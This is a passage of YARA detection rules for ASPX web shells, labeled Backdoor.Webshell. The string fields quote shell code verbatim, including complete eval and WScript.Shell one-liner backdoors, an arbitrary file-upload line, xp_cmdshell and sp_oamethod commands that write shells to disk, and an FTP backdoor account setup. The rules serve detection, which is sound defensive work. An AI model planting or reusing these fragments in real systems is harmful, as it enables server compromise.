        $x11 = "Response.AddHeader(\"Content-Disposition\",\"attachment;filename=\"+HttpUtility.UrlEncode(fi.Name,System.Text.Encoding.UTF8));" fullword ascii
        $x12 = "<asp:LinkButton ID=\"Bin_Button_Logout\" runat=\"server\" OnClick=\"Bin_Button_Logout_Click\" Text=\"Logout\" ></asp:LinkButton>" ascii
        $x13 = "foreach(ManagementObject p in Bin_WmiQuery(\"root\\\\CIMV2\",\"Select * from Win32_Process Where ProcessID ='\"+pid+\"'\"))" fullword ascii
        $x14 = "if(Bin_ExecSql(\"exec master..xp_makecab '\" + tmppath + \"\\\\~098611.tmp','default',1,'\" + Bin_TextBox_Source.Value + \"" fullword ascii
        $x15 = "return string.Format(\"<a href=\\\"javascript:Bin_PostBack('zcg_KillProcess','{0}')\\\">Kill</a>\",pid);" fullword ascii
        $s16 = "tc.Text=\"<a href=\\\"javascript:Bin_PostBack('zcg_ClosePM','\"+Bin_ToBase64(de.Key.ToString())+\"')\\\">Close</a>\";" fullword ascii
        $s17 = "<td style=\"width:20%\" align=\"left\">Target : <input id=\"Bin_TextBox_Target\" class=\"input\" runat=\"server\" type=\"text\" " ascii
        $s18 = "Bin_ExecSql(\"IF OBJECT_ID('bin_temp')IS NOT NULL DROP TABLE bin_temp\");" fullword ascii
        $s19 = "Bin_ExecSql(\"If object_id('bin_temp')is not null drop table bin_temp\");" fullword ascii
        $s20 = ".GetFileName(Bin_TextBox_Target.Value) + \"'\")){Bin_Msg(\"File Copyed,Good Luck!\");}" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 300KB and ( 1 of ($x*) and all of them ) ) or ( all of them )
}

rule b34dc244daf87fcb4c6f50b93366dd737275925d
{
    meta:
        description = "aspx - file b34dc244daf87fcb4c6f50b93366dd737275925d.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "430614527f4bab5e27b421939bf170ce5ce84ba03598385d36815602ebe67b5d"
    strings:
        $s1 = "<% If Request.Files.Count <> 0 Then Request.Files(0).SaveAs(Server.MapPath(Request(\"f\")) ) %>" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule sig_105be49285cefffd977086f5eacdadde7311f70b
{
    meta:
        description = "aspx - file 105be49285cefffd977086f5eacdadde7311f70b.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "ff69949c873a911e6dc3f7a026063776f54e5c897241fd68ceba360825335a6f"
    strings:
        $s1 = "556675766874782F4C75696E5E237E2360" ascii /* hex encoded string 'Ufuvhtx/Luin^#~#`' */
        $s2 = "s = s + char(int(q)-p);// + \"|\" + p +\"|\";" fullword ascii
        $s3 = "exs(exs(dec(\"556675766874782F4C75696E5E237E2360\",\"1314\"))); " fullword ascii
        $s4 = "<script runat=\"server\" language=\"JScript\">" fullword ascii
        $s5 = "q = \"0x\"+ str.substr(k, 2);" fullword ascii
        $s6 = "q = \"0x\"+ str.substr(k, 4);" fullword ascii
    condition:
        ( uint16(0) == 0x733c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule sig_5af49624cc19a4cd70989287c7d3d3edec0714c5
{
    meta:
        description = "aspx - file 5af49624cc19a4cd70989287c7d3d3edec0714c5.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "b3303b610b955dfc13d3f554a042661f7249e83a78888377192d0eec6c2e925e"
    strings:
        $x1 = "File.SetAttributes(path, File.GetAttributes(path) - FileAttributes.System)" fullword ascii
        $s2 = "response.Write(\"<script>alert('File info have add the cutboard, go to target directory click plaste!')</sc\"&\"ript>\")" fullword ascii
        $s3 = "myProcessStartInfo.UseShellExecute = False" fullword ascii
        $s4 = "db_cmd.ExecuteNonQuery()" fullword ascii
        $s5 = "File.SetAttributes(path, File.GetAttributes(path) - FileAttributes.ReadOnly)" fullword ascii
        $s6 = "response.addHeader(\"Content-Disposition\", \"attachment; filename=\" & replace(server.UrlEncode(path.getfilename(thePath" fullword ascii
        $s7 = "rk = Registry.Users.OpenSubKey( Right(hu , Len(hu) - Instr( hu,\"\\\" )) , 0 )" fullword ascii
        $s8 = "myProcessStartInfo.Arguments = CMDCommand.text" fullword ascii
        $s9 = "<asp:HyperLink id=\"HyperLink1\" runat=\"server\" Visible=\"True\" Target=\"_blank\" NavigateUrl=\"http://canglangjidi.qyun.n" fullword ascii
        $s10 = "recResult = adoConn.Execute(strQuery)" fullword ascii
        $s11 = "<asp:Label id=\"DB_exe\" runat=\"server\" height=\"37px\" visible=\"False\">Execute SQL :</asp:Label>" fullword ascii
        $s12 = "<asp:TextBox class=\"TextBox\" id=\"CMDPath\" runat=\"server\" Wrap=\"False\" Text=\"cmd.exe\" Width=\"250px\">c:\\windows\\syst" ascii
        $s13 = "<asp:TextBox class=\"TextBox\" id=\"CMDPath\" runat=\"server\" Wrap=\"False\" Text=\"cmd.exe\" Width=\"250px\">c:\\windows\\syst" ascii
        $s14 = "File.SetAttributes(path, File.GetAttributes(path) - FileAttributes.Archive)" fullword ascii
        $s15 = "File.SetAttributes(path, File.GetAttributes(path) - FileAttributes.Hidden)" fullword ascii
        $s16 = "DataCStr.Text = \"Provider=Microsoft.Jet.OLEDB.4.0;Data Source=E:\\MyWeb\\UpdateWebadmin\\guestbook.mdb\"" fullword ascii
        $s17 = "File.SetAttributes(path, File.GetAttributes(path) Or FileAttributes.System)" fullword ascii
        $s18 = "directory.createdirectory(temp & Path.GetFileName(mid(tmp, 1, len(tmp)-1)))" fullword ascii
        $s19 = "32\\cmd.exe</asp:TextBox>" fullword ascii
        $s20 = "rk = Registry.CurrentConfig.OpenSubKey( Right(hu , Len(hu) - Instr( hu,\"\\\" )) , 0 )" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 100KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_1c0ea48007e7936e405eee8d8b03f0eee054d222
{
    meta:
        description = "aspx - file 1c0ea48007e7936e405eee8d8b03f0eee054d222.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "2dc8b0b853d520e1a985fc43f69930f46c7b007dc5b41b34c82be1b0c7875302"
    strings:
        $s1 = "<%=CreateObject(\"WScript.Shell\").exec(Request.Request.QueryString(\"a\").trim).StdOut.ReadAll%>" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule sig_69472817d60a836fa2f055c2c73acc2da17daf8b
{
    meta:
        description = "aspx - file 69472817d60a836fa2f055c2c73acc2da17daf8b.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "51d564b700c985fd7aba31ed6a0b8f7b7ddaa7a2adcdaf8d649adb2641ade061"
    strings:
        $x1 = "string select = \"<input type=hidden name=goaction><input type=hidden name=todo><input type=hidden name=intext><select onchange=" ascii
        $x2 = "<asp:TextBox ID=\"Bin_SucmdTextBox\" runat=\"server\" Width=\"447px\">cmd.exe /c net user</asp:TextBox><br />" fullword ascii
        $x3 = "@s,'run',NULL,'cmd.exe /c echo ^&lt;%execute(request(char(35)))%^> > c:\\\\1.asp';\\\">SP_oamethod exec<option value=\\\"sp_make" ascii
        $x4 = "Copyright (C) 2009 Bin -> <a href=\"http://www.7jyewu.cn\" target=\"_blank\">www.7jyewu.cn</a></asp:Panel><asp:Panel ID=" fullword ascii
        $x5 = "string newdomain = \"-SETUSERSETUP\\r\\n-IP=0.0.0.0\\r\\n-PortNo=52521\\r\\n-User=bin\\r\\n-Password=binftp\\r\\n-HomeDir=c:" ascii
        $x6 = "CmdPath : &nbsp;<asp:TextBox ID=\"Bin_CmdPathTextBox\" runat=\"server\" Width=\"395px\">C:\\Windows\\System32\\Cmd.ex" fullword ascii
        $s7 = "string newdomain = \"-SETUSERSETUP\\r\\n-IP=0.0.0.0\\r\\n-PortNo=52521\\r\\n-User=bin\\r\\n-Password=binftp\\r\\n-HomeDir=c:" ascii
        $s8 = "iisinfo += \"<TD><a href=javascript:Command('change','\" + formatpath(newdir1.Properties[\"Path\"].Value.ToStrin" fullword ascii
        $s9 = "Bin_Filelist += \"<i><b><a href=javascript:Command('change','\" + parstr + \"');>|Parent Directory|</a></b></i>\";" fullword ascii
        $s10 = "tmpstr += \"<td><a href=javascript:Command('change','\" + foldername + \"')>\" + Bin_folder.Name + \"</a></td><td><b>" fullword ascii
        $s11 = "file += \"<a href=javascript:Command('change','\" + formatpath(drivers[i]) + \"');>\" + drivers[i] + \"</a>&nbsp;\";" fullword ascii
        $s12 = "<asp:Button ID=\"Bin_SAexecButton\" runat=\"server\" Text=\"SA_Exec\" OnClick=\"Bin_SAexecButton_Click\" /><br />" fullword ascii
        $s13 = "and('showatt','\" + filename + \"');>Att</a>|<a href=javascript:Command('del','\" + filename + \"');>Del</a></td>\";" fullword ascii
        $s14 = "<asp:Label ID=\"Bin_ErrorLabel\" runat=\"server\" EnableViewState=\"False\">Copyright (C) 2009 Bin -> <a href=\"http://www." fullword ascii
        $s15 = "sk @outputfile='d:\\\\web\\\\bin.asp',@charset=gb2312,@query='select ''<%execute(request(chr(35)))\" + \"%\" + \">''' \\\">SP_ma" ascii
        $s16 = "<asp:Button ID=\"Bin_SACMDButton\" runat=\"server\" Text=\"SA_Exec\" OnClick=\"Bin_SACMDButton_Click\" />" fullword ascii
        $s17 = "<asp:Button ID=\"Bin_LogshellButton\" runat=\"server\" Text=\"Bak_LOG\" OnClick=\"Bin_LogshellButton_Click\" /><hr /></a" fullword ascii
        $s18 = "Bin_SQLconnTextBox.Text = @\"Provider=Microsoft.Jet.OLEDB.4.0;Data Source=E:\\wwwroot\\database.mdb\";" fullword ascii
        $s19 = "<asp:Button ID=\"Bin_ExecButton\" runat=\"server\" OnClick=\"Bin_ExecButton_Click\" Text=\"Exec\" />" fullword ascii
        $s20 = "InfoLabel.Text += Bin_Process() + \"<hr>\";" fullword ascii
    condition:
        ( uint16(0) == 0xbbef and filesize < 200KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule dda389a120f4326161dda0e94bb1daffb4941c7b
{
    meta:
        description = "aspx - file dda389a120f4326161dda0e94bb1daffb4941c7b.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "0332aa294b7d4836fdf730b0d9317338a1faf17ead2a64591e6c912a791034ba"
    strings:
        $s1 = "WebAdmin2Y.x.y aaaaa = new WebAdmin2Y.x.y(\"add6bb58e139be10\");" fullword ascii
    condition:
        ( uint16(0) == 0x203c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule sig_1be33f7949c2f0d8c099c7b90e836bee364664c3
{
    meta:
        description = "aspx - file 1be33f7949c2f0d8c099c7b90e836bee364664c3.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "ce82de409c823d291ef54748f7e1fb68e462b4c5d078f3fb39f92f3c9690210e"
    strings:
        $s1 = "<% If Request.Files.Count <> 0 Then Request.Files(0).SaveAs(Server.MapPath(Request(" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule sig_142adc8e3b5d62a139e42a0fc82bcb5fb37ecccf
{
    meta:
        description = "aspx - file 142adc8e3b5d62a139e42a0fc82bcb5fb37ecccf.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "9bcdd0ddafd851662dd118ce5166a12d56a24dfdbdce713f8fded230734d7c11"
    strings:
        $x1 = "</span>CMD Path:<asp:TextBox ID=\"cmdpath\" runat=\"server\" Width=\"755px\">c:\\windows\\system32\\cmd.exe</asp:TextBox><br />" fullword ascii
        $s2 = "<asp:Button ID=\"Execute\" runat=\"server\" OnClick=\"Execute_Click\" Text=\"Execute\" /><br />" fullword ascii
        $s3 = "CMD Line:<asp:TextBox ID=\"cmdline\" runat=\"server\" Width=\"756px\">/c set</asp:TextBox>" fullword ascii
        $s4 = "protected void Execute_Click(object sender, EventArgs e)" fullword ascii
        $s5 = "p.StartInfo.UseShellExecute = false;" fullword ascii
        $s6 = "<asp:TextBox ID=\"result\" runat=\"server\" Height=\"460px\" TextMode=\"MultiLine\" Width=\"901px\"></asp:TextBox></div>" fullword ascii
        $s7 = "result.Text = RunCmd(path, cmd, wkdir);" fullword ascii
        $s8 = "protected string RunCmd(string path, string cmd, string curdir)" fullword ascii
        $s9 = "CurrentDir:<asp:TextBox ID=\"curdir\" runat=\"server\" Width=\"755px\"></asp:TextBox><br />" fullword ascii
        $s10 = "string cmd = cmdline.Text;" fullword ascii
        $s11 = "<span style=\"color: #ff99ff\">Cmd.aspx powered by " fullword ascii
        $s12 = "if(!IsPostBack) curdir.Text = Server.MapPath(\".\");" fullword ascii
        $s13 = "cmd.asp" fullword ascii
        $s14 = "retval += p.StandardError.ReadToEnd();" fullword ascii
        $s15 = "p.StartInfo.RedirectStandardError = true;" fullword ascii
        $s16 = "p.StartInfo.Arguments = cmd;" fullword ascii
        $s17 = "<script runat=\"server\" language=\"C#\">" fullword ascii
        $s18 = "retval += \"\\r\\n----------- " fullword ascii
        $s19 = "retval = \"\\r\\n----------- " fullword ascii
        $s20 = "and Cmd.aspx</title>" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 8KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_3b34a5e22973f7ffc558896025fbd056b9275bf5
{
    meta:
        description = "aspx - file 3b34a5e22973f7ffc558896025fbd056b9275bf5.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "e522eebba2a083d07e1862bb8242dde6dedff8964ef8d4c0e3d9779c7841e929"
    strings:
        $x1 = "string select = \"<input type=hidden name=goaction><input type=hidden name=todo><input type=hidden name=intext><select onchange=" ascii
        $x2 = "<asp:TextBox ID=\"Bin_SucmdTextBox\" runat=\"server\" Width=\"447px\">cmd.exe /c net user</asp:TextBox><br />" fullword ascii
        $x3 = "@s,'run',NULL,'cmd.exe /c echo ^&lt;%execute(request(char(35)))%^> > c:\\\\1.asp';\\\">SP_oamethod exec<option value=\\\"sp_make" ascii
        $x4 = "Copyright (C) 2016 Bin -> <a href=\"http://www.asp-muma.com\" target=\"_blank\">www.asp-muma.com</a></asp:Panel><asp:Pan" fullword ascii
        $x5 = "string newdomain = \"-SETUSERSETUP\\r\\n-IP=0.0.0.0\\r\\n-PortNo=52521\\r\\n-User=bin\\r\\n-Password=binftp\\r\\n-HomeDir=c:" ascii
        $x6 = "CmdPath : &nbsp;<asp:TextBox ID=\"Bin_CmdPathTextBox\" runat=\"server\" Width=\"395px\">C:\\Windows\\System32\\Cmd.ex" fullword ascii
        $s7 = "Copyright (C) 2016 Bin -> <a href=\"http://www.asp-muma.com\" target=\"_blank\">www.asp-muma.com</a></asp:Panel><asp:Panel ID=\"" ascii
        $s8 = "asp-muma.com\" target=\"_blank\">www.asp-muma.com</a> -> <a href=\"http://www.rootkit.net.cn/index.aspx\" target=\"_blank\">Reve" ascii
        $s9 = "string newdomain = \"-SETUSERSETUP\\r\\n-IP=0.0.0.0\\r\\n-PortNo=52521\\r\\n-User=bin\\r\\n-Password=binftp\\r\\n-HomeDir=c:" ascii
        $s10 = "<asp:Label ID=\"Bin_ErrorLabel\" runat=\"server\" EnableViewState=\"False\">Copyright (C) 2009 Bin -> <a href=\"http://www.asp-m" ascii
        $s11 = "iisinfo += \"<TD><a href=javascript:Command('change','\" + formatpath(newdir1.Properties[\"Path\"].Value.ToStrin" fullword ascii
        $s12 = "Bin_Filelist += \"<i><b><a href=javascript:Command('change','\" + parstr + \"');>|Parent Directory|</a></b></i>\";" fullword ascii
        $s13 = "tmpstr += \"<td><a href=javascript:Command('change','\" + foldername + \"')>\" + Bin_folder.Name + \"</a></td><td><b>" fullword ascii
        $s14 = "file += \"<a href=javascript:Command('change','\" + formatpath(drivers[i]) + \"');>\" + drivers[i] + \"</a>&nbsp;\";" fullword ascii
        $s15 = "<asp:Button ID=\"Bin_SAexecButton\" runat=\"server\" Text=\"SA_Exec\" OnClick=\"Bin_SAexecButton_Click\" /><br />" fullword ascii
        $s16 = "and('showatt','\" + filename + \"');>Att</a>|<a href=javascript:Command('del','\" + filename + \"');>Del</a></td>\";" fullword ascii
        $s17 = "<asp:Label ID=\"Bin_ErrorLabel\" runat=\"server\" EnableViewState=\"False\">Copyright (C) 2009 Bin -> <a href=\"http://www." fullword ascii
        $s18 = "sk @outputfile='d:\\\\web\\\\bin.asp',@charset=gb2312,@query='select ''<%execute(request(chr(35)))\" + \"%\" + \">''' \\\">SP_ma" ascii
        $s19 = "<asp:Button ID=\"Bin_SACMDButton\" runat=\"server\" Text=\"SA_Exec\" OnClick=\"Bin_SACMDButton_Click\" />" fullword ascii
        $s20 = "<asp:Button ID=\"Bin_LogshellButton\" runat=\"server\" Text=\"Bak_LOG\" OnClick=\"Bin_LogshellButton_Click\" /><hr /></a" fullword ascii
    condition:
        ( uint16(0) == 0xbbef and filesize < 200KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_61d96c7eaa357f7fac191849f5a0449a1a3f40c3
{
    meta:
        description = "aspx - file 61d96c7eaa357f7fac191849f5a0449a1a3f40c3.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "6f05055413ed95f501da9b6282cfc012d6201853b620a59d250edeac66474c16"
    strings:
        $x1 = "Copyright &copy; 2009 Bin -- <a href=\"http://www.rootkit.net.cn\" target=\"_blank\">www.rootkit.net.cn</a>" fullword ascii
        $x2 = "href=\"http://www.rootkit.net.cn\" target=\"_blank\">Bin'Blog</a> All Rights Reserved.</div></div>" fullword ascii
        $s3 = "<div style=\"padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#eee;\">Copyright &copy; 2006-2009 <" ascii
        $s4 = "Bin_Button_KillMe.Attributes[\"onClick\"]=\"if(confirm('Are you sure delete ASPXSPY?')){Bin_PostBack('hae','');};\";" fullword ascii
        $s5 = "<td ><span style=\"float:right;\"><a href=\"http://www.rootkit.net.cn\" target=\"_blank\">ASPXSpy Ver: 2009</a></span><span id=" ascii
        $s6 = "<td ><span style=\"float:right;\"><a href=\"http://www.rootkit.net.cn\" target=\"_blank\">ASPXSpy Ver: 2009</a></span><span id=" ascii
        $s7 = "public string Password=\"21232f297a57a5a743894a0e4a801fc3\";//admin" fullword ascii
        $s8 = "an_SNAME\" runat=\"server\" enableviewstate=\"true\"></span></td>" fullword ascii
        $s9 = "<title>ASPXspy</title>" fullword ascii
    condition:
        ( uint16(0) == 0xbbef and filesize < 200KB and ( 1 of ($x*) and all of them ) ) or ( all of them )
}

rule sig_2409eda9047085baf12e0f1b9d0b357672f7a152
{
    meta:
        description = "aspx - file 2409eda9047085baf12e0f1b9d0b357672f7a152.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "17db9706636b9891490362137976a24fcf66a38e496f111f6e98be4fcff60100"
    strings:
        $s1 = "start<asp:TextBox ID=\"Fport_TextBox\" runat=\"server\" Text=\"c:\\\" Width=\"60px\"></asp:TextBox> " fullword ascii
        $s2 = "TimeSpan usetime = System.DateTime.Now - start;" fullword ascii
        $s3 = "System.DateTime start = DateTime.Now;" fullword ascii
        $s4 = "<asp:Button ID=\"Button\" runat=\"server\" OnClick=\"ClearAllThread_Click\" Text=\"ScanWriterable\" /><br />" fullword ascii
        $s5 = "Stopat <asp:TextBox ID=\"TextBox_stopat\" runat=\"server\" Text=\"5\" Width=\"60px\"></asp:TextBox>files" fullword ascii
        $s6 = "<div>code by <a href =\"http://www.cncert.net\">www.cncert.net</a></div>" fullword ascii
        $s7 = "this.Lb_msg.Text +=\"usetime: \"+ usetime.TotalSeconds.ToString();" fullword ascii
        $s8 = "DirectoryInfo[] subdirs = cdir.GetDirectories();" fullword ascii
        $s9 = "<asp:Label ID=\"Lb_msg\" runat=\"server\" Text=\"\"></asp:Label>" fullword ascii
        $s10 = "ScanRights(new DirectoryInfo(Fport_TextBox.Text));" fullword ascii
        $s11 = "protected void ClearAllThread_Click(object sender, EventArgs e)" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 4KB and ( 8 of them ) ) or ( all of them )
}

rule sig_6725c41e001832d776f557d046d52990e418f049
{
    meta:
        description = "aspx - file 6725c41e001832d776f557d046d52990e418f049.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "326e5194120403c2fb93524aff1a8b7d30b031e3d513bfaaf895bb7b191432bf"
    strings:
        $s1 = "<%eval(Request.Item[\"maskshell\"])%>" fullword ascii
    condition:
        ( uint16(0) == 0x6854 and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule sig_86fe242a3774132e3b79ded53b53595b139f1e17
{
    meta:
        description = "aspx - file 86fe242a3774132e3b79ded53b53595b139f1e17.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "4ee2139f9acaf9c97c05e6538a641009ea3caca6d05b33dbf0cd412f67409f0b"
    strings:
        $x1 = "Width=\"262px\">C:\\windows\\system32\\cmd.exe</asp:TextBox>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br />" fullword ascii
        $x2 = "Width=\"264px\">C:\\recyled\\cmd.exe</asp:TextBox>&nbsp;<asp:Button " fullword ascii
        $s3 = "seay.StartInfo.UseShellExecute = false;" fullword ascii
        $s4 = "<a href=\"http://seay.sinaapp.com/\">http://seay.sinaapp.com/</a><br />" fullword ascii
        $s5 = "cmd_output.InnerHtml = \"<hr width=\\\"100%\\\" noshade/><pre>\" + cmd_msg + \"</pre>\";" fullword ascii
        $s6 = "http://seay.sinaapp.com/  " fullword ascii
        $s7 = "<%@ Page Language=\"C#\" AutoEventWireup=\"true\"  CodeFile=\"Default.aspx.cs\" Inherits=\"_Default\" %>" fullword ascii
        $s8 = "<asp:TextBox ID=\"txt_cmdtxt\" runat=\"server\" style=\"margin-left: 0px\" " fullword ascii
        $s9 = "<asp:TextBox ID=\"txt_cmdpath\" runat=\"server\" style=\"margin-left: 0px\" " fullword ascii
        $s10 = "<div style=\"background-color: #F0F0F0; width: 416px; height: 108px; float: none; text-align: left; margin-right: 0px;\">" fullword ascii
        $s11 = "ClientScript.RegisterStartupScript(typeof(string), \"\", \"alert('" fullword ascii
        $s12 = "Process seay = new Process();" fullword ascii
        $s13 = "ID=\"Button2\" runat=\"server\" Height=\"21px\" onclick=\"Button2_Click\" " fullword ascii
        $s14 = "<asp:TextBox ID=\"txt_Filepath\" runat=\"server\" style=\"margin-left: 0px\" " fullword ascii
        $s15 = "seay.StandardInput.WriteLine(cmd);" fullword ascii
        $s16 = "Width=\"262px\">net user</asp:TextBox>&nbsp;<asp:Button ID=\"Button1\" " fullword ascii
        $s17 = "seay.StartInfo.RedirectStandardError = true;" fullword ascii
        $s18 = "border-color: #C0C0C0; text-align: left; font-weight: normal; width: 699px; height: auto\">" fullword ascii
        $s19 = "cmd_msg = seay.StandardOutput.ReadToEnd();" fullword ascii
        $s20 = "<asp:FileUpload ID=\"FileUpload1\" runat=\"server\" />" fullword ascii
    condition:
        ( uint16(0) == 0xbbef and filesize < 10KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_85b6a4ebb48a584a73515d485d33508a1266ed14
{
    meta:
        description = "aspx - file 85b6a4ebb48a584a73515d485d33508a1266ed14.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "24190b89cc032a045b7d6ac2eb51992553a05872c4f5f972ee481b5029556a03"
    strings:
        $s1 = "/*-/*-*/,/*-/*-*/\"u\"+\"n\"+\"s\"/*-/*-*/+\"a\"+\"f\"+\"e\"/*-/*-*/);%>" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule f85cf490d7eb4484b415bea08b7e24742704bdda
{
    meta:
        description = "aspx - file f85cf490d7eb4484b415bea08b7e24742704bdda.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "46942a63d4d7113cca44fd86155915de0edaa1732177f878987e5893801e2daf"
    strings:
        $s1 = "Bin_Button_KillMe.Attributes[\"onClick\"]=\"if(confirm('Are you sure delete zombie?')){Bin_PostBack('hae','');};\";" fullword ascii
        $s2 = "Response.Redirect(\"http://www.baidu.com\");" fullword ascii
        $s3 = "public string Password=\"d1c94b3de6de8ba0d5492e44105ee069\";" fullword ascii
        $s4 = "<td ><span style=\"float:right;\"><a href=\"\" target=\"_blank\">zombie Ver: 2009</a></span><span id=\"Bin_Span_Sname\" runat=\"" ascii
        $s5 = "<td ><span style=\"float:right;\"><a href=\"\" target=\"_blank\">zombie Ver: 2009</a></span><span id=\"Bin_Span_Sname\" runat=\"" ascii
        $s6 = "<div style=\"padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#eee;\"></div></div>" fullword ascii
        $s7 = "<a href=\"\" target=\"_blank\"></a>" fullword ascii
        $s8 = "<form id=\"zombie\" runat=\"server\">" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( all of them ) ) or ( all of them )
}

rule sig_97d9f6c411f54b56056a145654cd00abca2ff871
{
    meta:
        description = "aspx - file 97d9f6c411f54b56056a145654cd00abca2ff871.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "d9b5902f7596891b722d047423132000a0bb23e8a1c456c190f2bda9efb67e88"
    strings:
        $x1 = "<meta content=\"http://schemas.microsoft.com/intellisense/ie5\" name=\"vs_targetSchema\">" fullword ascii
        $s2 = "<meta content=\"Microsoft Visual Studio .NET 7.1\" name=\"GENERATOR\">" fullword ascii
        $s3 = "<asp:Label id=\"L4\" style=\"Z-INDEX: 107; LEFT: 144px; POSITION: absolute; TOP: 24px\" runat=\"server\"" fullword ascii
        $s4 = "<asp:Label id=\"L1\" style=\"Z-INDEX: 101; LEFT: 24px; POSITION: absolute; TOP: 96px\" runat=\"server\">" fullword ascii
        $s5 = "<asp:Button id=\"Button1\" style=\"Z-INDEX: 106; LEFT: 424px; POSITION: absolute; TOP: 504px\" runat=\"server\"" fullword ascii
        $s6 = "<asp:Label id=\"L2\" style=\"Z-INDEX: 103; LEFT: 24px; POSITION: absolute; TOP: 64px\" runat=\"server\">" fullword ascii
        $s7 = "<asp:Label id=\"L3\" style=\"Z-INDEX: 104; LEFT: 144px; POSITION: absolute; TOP: 96px\" runat=\"server\"" fullword ascii
        $s8 = "<asp:TextBox id=\"T1\" style=\"Z-INDEX: 102; LEFT: 144px; POSITION: absolute; TOP: 64px\" runat=\"server\"" fullword ascii
        $s9 = "<asp:TextBox id=\"T2\" style=\"Z-INDEX: 105; LEFT: 24px; POSITION: absolute; TOP: 128px\" runat=\"server\"" fullword ascii
        $s10 = "<meta content=\"JavaScript\" name=\"vs_defaultClientScript\">" fullword ascii
        $s11 = "System.IO.FileInfo fil = new System.IO.FileInfo(T1.Text);" fullword ascii
        $s12 = "<meta content=\"C#\" name=\"CODE_LANGUAGE\">" fullword ascii
        $s13 = "void Button1_Click(object sender, System.EventArgs e)" fullword ascii
        $s14 = "void Page_Load(object sender, System.EventArgs e)" fullword ascii
        $s15 = "System.IO.StreamWriter sw = fil.CreateText();" fullword ascii
        $s16 = "Width=\"504px\" Height=\"344px\" TextMode=\"MultiLine\"></asp:TextBox>" fullword ascii
        $s17 = "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0 Transitional//EN\" >" fullword ascii
    condition:
        ( uint16(0) == 0x6967 and filesize < 5KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_91b04c71d10448eae3d7e2fa9627f5fd50ed2ac4
{
    meta:
        description = "aspx - file 91b04c71d10448eae3d7e2fa9627f5fd50ed2ac4.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "41968d325563572b9fd3a1ff9579752af2cf6a1ba230c679f3d4f0e87ad83b50"
    strings:
        $s1 = "<%@ Page Language=\"Jscript\" validateRequest=\"false\" %>" fullword ascii
        $s2 = "Response.Write(eval(keng,\"unsafe\"));" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule f9286d7546090cfb2a7730e3c64cc2481819538d
{
    meta:
        description = "aspx - file f9286d7546090cfb2a7730e3c64cc2481819538d.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "bbee3a7eeceef058919740e7317cd8f552b194badf3cdc6922e42b115fdd7fa9"
    strings:
        $x1 = "ProcessStartInfo MyProcessStartInfo = new ProcessStartInfo(\"cmd.exe\");" fullword ascii
        $x2 = ":<asp:TextBox ID=\"TextBoxDurl\" runat=\"server\" Width=\"270px\">http://www.baidu.com/img/logo.gif</asp:TextBox></br>" fullword ascii
        $x3 = "Response.AddHeader(\"Content-Disposition\", \"attachment; filename=\" + HttpUtility.UrlEncode(file.Name));" fullword ascii
        $x4 = "cmd.CommandText = \"exec master..xp_cmdshell '\" + TextBoxSqlCon.Text + \"'\";" fullword ascii
